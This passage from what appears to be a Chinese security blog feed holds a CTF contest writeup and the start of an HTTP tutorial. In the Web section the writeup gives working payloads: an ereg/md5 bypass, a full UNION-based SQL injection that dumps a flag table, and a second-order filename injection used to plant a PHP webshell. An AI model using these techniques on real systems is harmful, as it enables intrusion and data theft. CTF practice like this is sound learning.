title="pass-12-00截断(POST)"></a>pass-12-00截断(POST)</h3><p>和pass-11几乎一毛一样，就是从GET变成了POST而已，直接放上payload：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0oGuV.png" alt="k0oGuV.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;从打完校赛开始到现在，身为萌新，寒假就研究了一下文件上传这部分内容，还是自己动手实践一下比较好，还可以学学代码审计；
    
    </summary>
    
      <category term="靶场通关笔记" scheme="https://gardenia30.top/categories/%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="upload" scheme="https://gardenia30.top/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>CUMT-CTF第二次双月赛Writeup</title>
    <link href="https://gardenia30.top/2019/02/03/CUMT-CTF%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%8F%8C%E6%9C%88%E8%B5%9BWriteup/"/>
    <id>https://gardenia30.top/2019/02/03/CUMT-CTF第二次双月赛Writeup/</id>
    <published>2019-02-03T07:01:34.000Z</published>
    <updated>2019-02-03T07:19:27.561Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>毕竟是萌新，能有校赛打已经很开心了，感谢Source大佬的带飞，下面放上本次双月赛的部分题解；<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>是个easy的绕过，给出源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$white_list = range(0,9);</span><br><span class="line">require_once(&apos;flag.php&apos;);</span><br><span class="line">if(isset($_REQUEST[&apos;0ver&apos;]) &amp;&amp; isset($_REQUEST[&apos;0ver1&apos;]) &amp;&amp; isset($_REQUEST[&apos;0ver2&apos;]))&#123;</span><br><span class="line">    $a = $_REQUEST[&apos;0ver&apos;];</span><br><span class="line">    $b = $_REQUEST[&apos;0ver1&apos;];</span><br><span class="line">    $c = $_REQUEST[&apos;0ver2&apos;];</span><br><span class="line">    if(@ereg(&quot;^[0-9]+$&quot;, $a) === FALSE)&#123;</span><br><span class="line">        echo &apos;no must be number&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if(in_array($a,$white_list))&#123;</span><br><span class="line">            if(strlen($a)&gt;1)&#123;</span><br><span class="line">                if(md5($c) === md5($b) &amp;&amp; ($b !== $c))&#123;</span><br><span class="line">                    echo &quot;&lt;img src=&apos;dark.png&apos;&gt;&lt;br&gt;&quot;;</span><br><span class="line">                    echo &apos;you are a great dark phper&lt;br&gt;&apos;;</span><br><span class="line">                    echo $flag;</span><br><span class="line">                &#125;</span><br><span class="line">                else&#123;</span><br><span class="line">                    echo &quot;you can do it!!!&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &apos;you no dark&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &apos;you are so dark&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;else</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>考察<code>ereg()</code>和<code>md5()</code>的绕过姿势，00截断绕过<code>ereg</code>，上传数组绕过<code>md5</code>，即可得到flag如下：</p><p><img src="https://s2.ax1x.com/2019/01/25/kmRqk8.png" alt="kmRqk8.png"></p><p><strong>payload：</strong><code>http://202.119.201.199:32790/index.php?0ver=5%00a&amp;0ver1[]=a&amp;0ver2[]=b</code></p><h3 id="SimpleUpload"><a href="#SimpleUpload" class="headerlink" title="SimpleUpload"></a>SimpleUpload</h3><p>是个前端验证，只允许上传图片，不允许上传php为后缀的文件，只需要bp截取改后缀名即可；</p><p><a href="https://imgchr.com/i/kMY3XF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMY3XF.md.png" alt="kMY3XF.md.png"></a></p><h3 id="小型线上赌场"><a href="#小型线上赌场" class="headerlink" title="小型线上赌场"></a>小型线上赌场</h3><p>一开始没有思路，毕竟是萌新还没有了解到CTF的很多姿势，请教新城瑞雪大佬得知是vim文件泄露，在vim编辑的时候没有正常退出，系统就会自动生成一个swp文件用来日后的恢复；直接down下来，vim打开得源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$invest = $_GET[&apos;invest&apos;];  </span><br><span class="line">$rand = rand(2,50);  </span><br><span class="line">$len = strlen(trim($_GET[&apos;invest&apos;]));</span><br><span class="line">foreach ($_GET as $key =&gt; $value) &#123;</span><br><span class="line">    if(!is_numeric($value)||$value == &apos;0&apos;)&#123;</span><br><span class="line">        die(&apos;no no no!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$money = number_format($invest*$rand);</span><br><span class="line">$money = intval(str_replace(&apos;,&apos;,&apos;&apos;,$money));</span><br><span class="line">$guess = intval($_GET[&apos;guess&apos;]); </span><br><span class="line">if ($guess == $money &amp;&amp; strlen($money)===$len)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看懂源码意思即可，生成<code>2~50</code>的随机数<code>rand</code>，<code>money</code>为<code>$invest*$rand</code>；如果<code>$money==$guess</code>就回显flag，即<code>invest*倍数==guess</code>即可，那我们可以直接直接bp爆破，猜一个<code>guess</code>，固定<code>invest</code>和<code>guess</code>的值，多次爆破，如果次数达到一定的上限一定会出现猜对倍数的情况，这样的话就会输出flag；</p><p><strong>bp爆破设置：</strong></p><ol><li><p>不设置变量；</p><p><a href="https://imgchr.com/i/kMdro4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMdro4.md.png" alt="kMdro4.md.png"></a></p></li><li><p>设置payload类型为<code>null payloads</code>，上限次数设置大一点为2000；</p><p><a href="https://imgchr.com/i/kMdEIH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMdEIH.md.png" alt="kMdEIH.md.png"></a></p></li><li><p>随便设置一下options即可start；</p></li></ol><p><strong>结果：</strong></p><p>升序排列length即可发现不匹配的特殊项，发现flag；</p><p><a href="https://imgchr.com/i/kMdfOK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMdfOK.md.png" alt="kMdfOK.md.png"></a></p><p><a href="https://imgchr.com/i/kMdqSI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMdqSI.md.png" alt="kMdqSI.md.png"></a></p><h3 id="SimpleSQLi"><a href="#SimpleSQLi" class="headerlink" title="SimpleSQLi"></a>SimpleSQLi</h3><ol><li>首先输入<code>?id=1%27</code>报错；</li><li>接着注释掉后面的引号<code>?id=1%27%23</code>，回显正常，说明猜测成功存在注入点；</li></ol><p><img src="https://s2.ax1x.com/2019/01/25/kmW7v9.png" alt="kmW7v9.png"></p><ol start="3"><li><p>接下来就是用order by去猜列数，<code>?id=1%27%20order%20by%203%23</code>回显正常应该是三列没错；</p></li><li><p>下面需要用union select去回显某一列的东西，构造<code>?id=-1%27%20union%20select%201,2,3%23</code>；这里需要第一句话为空才能显示后面一句话的内容，选择id=-1，就可以回显2和3，后面就可以利用这两列回显想要的东西；</p></li></ol><p><img src="https://s2.ax1x.com/2019/01/25/kmfwrR.png" alt="kmfwrR.png"></p><ol start="5"><li>爆库名：<code>?id=-1%27%20union%20select%201,2,database()%20%23</code>为<code>security</code></li></ol><p><img src="https://s2.ax1x.com/2019/01/25/kmhMWD.png" alt="kmhMWD.png"></p><ol start="6"><li>爆表名，此处使用mysql里面自带的information_schema表；<code>id=-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23</code>发现flag表信息；</li></ol><p><img src="https://s2.ax1x.com/2019/01/25/kmfjLn.png" alt="kmfjLn.png"></p><ol start="7"><li>爆列名：<code>id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27flagishere%27%23</code>有Id和flag两列；</li></ol><p><img src="https://s2.ax1x.com/2019/01/25/kmhBlQ.png" alt="kmhBlQ.png"></p><ol start="8"><li>爆值：<code>?id=-1%27%20union%20select%201,2,group_concat(Id,0x3a,flag)%20from%20flagishere%23</code></li></ol><p><img src="https://s2.ax1x.com/2019/01/25/kmh4l4.png" alt="kmh4l4.png"></p><h3 id="文件管理系统"><a href="#文件管理系统" class="headerlink" title="文件管理系统"></a>文件管理系统</h3><p>队友Source在离别歌的blog里搜索到类似题目，了解到这题的切入点是二次注入；直接拿来payload就可以搞定这一题；</p><ol><li><p>先选择文件进行上传，filename为<code>&#39;,extension=&#39;&#39;,filename=&#39;x.jpg.jpg</code>；<img src="https://s2.ax1x.com/2019/01/28/kM0tK0.png" alt="kM0tK0.png"></p></li><li><p>Rename file，注入后文件系统中文件名为<code>xl.jpg.jpg</code><img src="https://s2.ax1x.com/2019/01/28/kM02qK.png" alt="kM02qK.png"></p></li><li><p>上传真的包含webshell的文件；<img src="https://s2.ax1x.com/2019/01/28/kMBUSA.png" alt="kMBUSA.png"></p></li><li><p>改名后缀为<code>.php</code>，连接菜刀即可；<img src="https://s2.ax1x.com/2019/01/28/kMBrTS.png" alt="kMBrTS.png"></p></li><li><p>flag在根目录；</p><p><a href="https://imgchr.com/i/kuqufs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/27/kuqufs.md.png" alt="kuqufs.md.png"></a><a href="https://imgchr.com/i/kuq1XV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/27/kuq1XV.md.png" alt="kuq1XV.md.png"></a></p></li></ol><p>参考链接：<a href="https://www.leavesongs.com/PENETRATION/some-sangebaimao-ctf-writeups.html" target="_blank" rel="noopener">leavesongs的博客</a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="现代密码签到"><a href="#现代密码签到" class="headerlink" title="现代密码签到"></a>现代密码签到</h3><p>一度以为是hash，因为base64decode出来是<code>Salted__</code>开头，真的是……被出题人虐到鼻青脸肿，和队里大佬讨论很久也不知道怎么办，还一度以为是AES，hint出来了是DES，也不知道密钥该如何解密……没想带直接找一个在线网站直接解密既可以了……密钥为空…… 狂喷一口老血……<img src="https://s2.ax1x.com/2019/01/25/km4Jc4.png" alt="km4Jc4.png"></p><p><a href="https://imgchr.com/i/km4V1g" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/25/km4V1g.md.png" alt="km4V1g.md.png"></a></p><p>在线解密一次以后再解一次即可得到flag：</p><p><a href="https://imgchr.com/i/km4buj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/25/km4buj.md.png" alt="km4buj.md.png"></a></p><p>这就是双重DES……</p><h3 id="古典密码签到"><a href="#古典密码签到" class="headerlink" title="古典密码签到"></a>古典密码签到</h3><p>也是解的很暴躁的一题，基本就是大家一开始都是base32出来就不知道那是什么玩意了……</p><p><a href="https://imgchr.com/i/km5n2D" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/25/km5n2D.md.png" alt="km5n2D.md.png"></a></p><p>翻看各种大佬的博客总结古典密码都没有这种奇怪的符号……直到队友解出来的那一刻我都是懵逼的(SourceNB)，放上解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s=<span class="string">"LZYGQ326N5QXMYAKORNG42TABJ2FUWS2MNRWG6A="</span></span><br><span class="line">c=base64.b32decode(s)</span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">    ans=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> c:</span><br><span class="line">        ans+=chr((ord(x)+i)%<span class="number">128</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'ctf'</span> <span class="keyword">in</span> ans:</span><br><span class="line">        <span class="keyword">print</span> ans</span><br></pre></td></tr></table></figure><p>在ASCII码内凯撒爆破即可：</p><p><img src="https://s2.ax1x.com/2019/01/25/km5oIx.png" alt="km5oIx.png"></p><p>慢着…这16进制是什么鬼……大胆猜测是easy_soeasy__hhh，填入果然没错……</p><p>总的来说做这两题的心情就是可以狂扁出题人小朋友了……</p><p><a href="https://imgchr.com/i/km5zdI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/25/km5zdI.md.png" alt="km5zdI.md.png"></a></p><h3 id="easyrsa"><a href="#easyrsa" class="headerlink" title="easyrsa"></a>easyrsa</h3><p>这题终于不是前面两题那么让人流泪了……，n和c里只出现了12个字符猜测是12进制；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n=36004b9A985A624479A4891b16130722A5A7453989bA61737A226368504A5689381236451796A445824b5A516b176b40135935b0b8999046154359b0560537100289b9795129505b461542A4897A56561529A705135AA772507bb3172b03b3425A99224b68b45b801459b29A070bAb9408761b4A70b905308772472934486924bA17013A2A801041A05178b0488AA5</span><br><span class="line">e=5</span><br><span class="line">c=411A016A671768793b5AAbA4A043001A468b8A9A6122290461266393181b021812b6AAbAA1b57161bAA300321174154862338b0098249626A93116b34752540987309A08520bb6780804b5679144173Ab7301b49322587504A75A7A2445928A07A650bb6076bA3412b1375205336b43A11A1510A22893b937065</span><br></pre></td></tr></table></figure><p>给出以下信息，<code>e=5</code>，猜测是低指数攻击，上解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">twl_to_dec</span><span class="params">(twl)</span>:</span></span><br><span class="line">ans=<span class="number">0</span></span><br><span class="line">l=len(twl)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line"><span class="keyword">if</span> twl[i]==<span class="string">'A'</span>:</span><br><span class="line">temp=<span class="number">10</span></span><br><span class="line"><span class="keyword">elif</span> twl[i]==<span class="string">'b'</span>:</span><br><span class="line">temp=<span class="number">11</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">temp=int(twl[i],<span class="number">10</span>)</span><br><span class="line">ans+=temp*pow(<span class="number">12</span>,l-i<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_msg</span><span class="params">(c,n,e)</span>:</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span>(gmpy2.iroot(c+i*n, e)[<span class="number">1</span>] == <span class="number">1</span>):</span><br><span class="line">        x = gmpy2.iroot(c+i*n, e)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> hex(x)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">n=<span class="string">"36004b9A985A624479A4891b16130722A5A7453989bA61737A226368504A5689381236451796A445824b5A516b176b40135935b0b8999046154359b0560537100289b9795129505b461542A4897A56561529A705135AA772507bb3172b03b3425A99224b68b45b801459b29A070bAb9408761b4A70b905308772472934486924bA17013A2A801041A05178b0488AA5"</span></span><br><span class="line">c=<span class="string">"411A016A671768793b5AAbA4A043001A468b8A9A6122290461266393181b021812b6AAbAA1b57161bAA300321174154862338b0098249626A93116b34752540987309A08520bb6780804b5679144173Ab7301b49322587504A75A7A2445928A07A650bb6076bA3412b1375205336b43A11A1510A22893b937065"</span></span><br><span class="line">e=<span class="number">5</span></span><br><span class="line">n=twl_to_dec(n)</span><br><span class="line">c=twl_to_dec(c)</span><br><span class="line">small_msg(c,n,e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>12进制转化为 10进制以后直接进行小公钥指数攻击即可，得到flag：</p><p><img src="https://s2.ax1x.com/2019/01/28/kM2DiV.png" alt="kM2DiV.png"></p><p><strong>友情提示：</strong>自己写的进制转换虽然丑，but肯定比网上在线转换靠谱（微笑.jpg）</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Misc签到"><a href="#Misc签到" class="headerlink" title="Misc签到"></a>Misc签到</h3><p>得到盲文图片如下，直接对应盲文表解出flag内容为：<code>BAIND</code>，将A换为1，加上flag提交即可；</p><p><img src="https://s2.ax1x.com/2019/01/28/kMBHfJ.png" alt="kMBHfJ.png"></p><h3 id="BXS图标真好看"><a href="#BXS图标真好看" class="headerlink" title="BXS图标真好看"></a>BXS图标真好看</h3><p>打开是个txt文件，查看内容发现<code>IDHR</code>关键字，猜测是png图片，直接改掉后缀得到一张图片；</p><p><img src="https://s2.ax1x.com/2019/01/28/kMDah4.png" alt="kMDah4.png"></p><p>发现flag相关内容，猜测是凯撒移位，但发现前面有8位，果断推翻猜想，继续猜测是栅栏密码，果然得到flag；</p><p><img src="https://s2.ax1x.com/2019/01/28/kMDvgs.png" alt="kMDvgs.png"></p><h3 id="base全家桶了解一下"><a href="#base全家桶了解一下" class="headerlink" title="base全家桶了解一下"></a>base全家桶了解一下</h3><p>nctf遇到过差不多的题，没什么难度；</p><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s=<span class="string">"R1kzRE1RWldHRTNET04yQ0dVM1RNTkpXSU0zREdNWlFHWkNETU5KVklZM1RJTVpRR01ZREtSUldHTTNUS05TRUc0MkRNTVpYR1EzRE1OMkU="</span></span><br><span class="line">c=base64.b64decode(s)</span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line">d=base64.b32decode(c)</span><br><span class="line"><span class="keyword">print</span> d</span><br><span class="line">e=base64.b16decode(d)</span><br><span class="line"><span class="keyword">print</span> e</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/kMroRJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMroRJ.md.png" alt="kMroRJ.md.png"></a></p><h3 id="起床改error啦"><a href="#起床改error啦" class="headerlink" title="起床改error啦"></a>起床改error啦</h3><p>唯一做到的Misc……队友Source太给力……拿到手是个png图片</p><p><img src="https://s2.ax1x.com/2019/01/28/kMsCQA.jpg" alt="kMsCQA.jpg"></p><p>丢进十六进制编辑器，发现猫腻，有zip文件头和flag信息；</p><p><img src="https://s2.ax1x.com/2019/01/28/kMsAdf.png" alt="kMsAdf.png"></p><p>扒下来另存为zip，解压得到flag.doc，但是里面没有flag；</p><p><img src="https://s2.ax1x.com/2019/01/28/kMs3wV.png" alt="kMs3wV.png"></p><p>提示直接告诉是doc隐写，那就显示隐藏文字即可，得到flag；</p><p><img src="https://s2.ax1x.com/2019/01/28/kMs2SH.png" alt="kMs2SH.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;毕竟是萌新，能有校赛打已经很开心了，感谢Source大佬的带飞，下面放上本次双月赛的部分题解；
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://gardenia30.top/tags/CTF/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
      <category term="Misc" scheme="https://gardenia30.top/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>深入了解HTTP请求流程</title>
    <link href="https://gardenia30.top/2019/01/22/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3HTTP%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B/"/>
    <id>https://gardenia30.top/2019/01/22/深入了解HTTP请求流程/</id>
    <published>2019-01-22T11:08:45.000Z</published>
    <updated>2019-02-19T12:25:37.192Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>你知道平时输入一个网址，简单地按下回车以后，客户端和服务端是怎样复杂运作的吗？<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>HTTP(HyperText Transfer)即超文本传输协议，是一种详细规定了浏览器和万维网服务器之间相互通信的规则，是万维网交换信息的基础，它允许将HTML文档从Web服务器传送到Web浏览器；</p><h2 id="发起HTTP请求"><a href="#发起HTTP请求" class="headerlink" title="发起HTTP请求"></a>发起HTTP请求</h2><p>问题很简单，也就是在浏览器地址栏中输入URL(统一资源定位符，简称网址)按下回车就已经发起了这个HTTP请求，很快就会看到请求的返回结果；</p><p>URL的标准格式：<code>协议://服务器IP [:端口]/路径/[?查询]</code></p><p>借助浏览器就可以快速发起一次HTTP请求，当然也可以借助其他工具，例如Linux中的curl命令；</p><h2 id="HTTP协议详解"><a href="#HTTP协议详解" class="headerlink" title="HTTP协议详解"></a>HTTP协议详解</h2><p>HTTP协议是一种无状态的协议，无状态是指Web浏览器与Web服务器之间不需要建立持久的连接，一个客户端发出请求，然后服务器返回响应，连接就被关闭了，服务器不保留连接的有关信息；HTTP请求只能由客户端发起，而服务器不能主动向客户端发送数据；</p><h3 id="HTTP请求与响应"><a href="#HTTP请求与响应" class="headerlink" title="HTTP请求与响应"></a>HTTP请求与响应</h3><h4 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h4><p>HTTP请求包括3部分，分别是请求行(请求方法)，请求头(消息报头)，请求正文；</p><p>如下为本地测试的结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /test/a2.php HTTP/1.1                //请求行</span><br><span class="line">Host: 127.0.0.1                           //请求头</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">content-type: application/x-www-form-urlencoded</span><br><span class="line">cache: no-cache</span><br><span class="line">origin: moz-extension://ea79062d-25c1-4d61-82fd-7b0d239923a7</span><br><span class="line">Content-Length: 8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">      //空白行，代表请求头结束</span><br><span class="line">b=123456                                  //请求正文</span><br></pre></td></tr></table></figure><p><strong>请求行：</strong>由三部分组成，第一部分<code>POST</code>为请求方式，第二部分<code>/test/a2.php</code>为该域名的目录下的文件，第三部分为<code>HTTP/1.1</code>说明的是HTTP的版本；</p><p><strong>请求头：</strong><code>HOST</code>为请求的主机地址，<code>User-Agent</code>为浏览器标识，其他内容有待以后学习中更新；</p><p><strong>请求正文：</strong>请求正文是可选的，最常出现在POST方法中；</p><h4 id="HTTP响应"><a href="#HTTP响应" class="headerlink" title="HTTP响应"></a>HTTP响应</h4><p>与HTTP请求对应，HTTP响应也是由3部分组成，分别是响应行，响应头，响应正文；</p><p>下面为上述本地测试的响应部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK                            //响应行</span><br><span class="line">Date: Tue, 22 Jan 2019 07:55:57 GMT        //响应头</span><br><span class="line">Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.5.38</span><br><span class="line">X-Powered-By: PHP/5.5.38</span><br><span class="line">Content-Length: 19</span><br><span class="line">Keep-Alive: timeout=5, max=100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">string(6) &quot;123456&quot;                         //响应正文</span><br></pre></td></tr></table></figure><p><strong>响应行：</strong>有HTTP版本，状态码，以及消息“OK”；</p><p><strong>响应头：</strong>由服务器向客户端发送；</p><p><strong>响应正文：</strong>是服务器向客户端发送的HTML数据；</p><h3 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h3><ol><li><p>GET</p><p>GET方法用于获取请求页面的指定信息。如果请求资源为动态脚本（not HTML），那么返回的文本就是Web容器解析后的HTML源代码，而不是源文件；</p></li><li><p>POST</p><p>和GET方式相似，最大区别就是GET方法没有请求内容，而POST是有请求内容的。POST请求最多用于向服务器发送大量数据，GET虽然也可以，但是有长度限制，并且GET请求会将发送的数据显示在浏览器端，而POST不会；</p></li><li><p>HEAD</p><p>HEAD除了服务器不能在响应里返回消息主体外，其他与GET相同，此方法常用于测试超文本链接的有效性，可访问性和最近的改变。只用于测试资源是否存在，而不用返回消息主体；速度最快；</p></li><li><p>PUT</p><p>用于请求服务器把请求中的实体存储在请求资源下</p></li><li><p>DELETE</p><p>用于请求源服务器删除请求的指定资源</p></li><li><p>TRACE</p></li><li><p>CONNECT</p></li><li><p>OPTIONS</p></li></ol><h3 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" 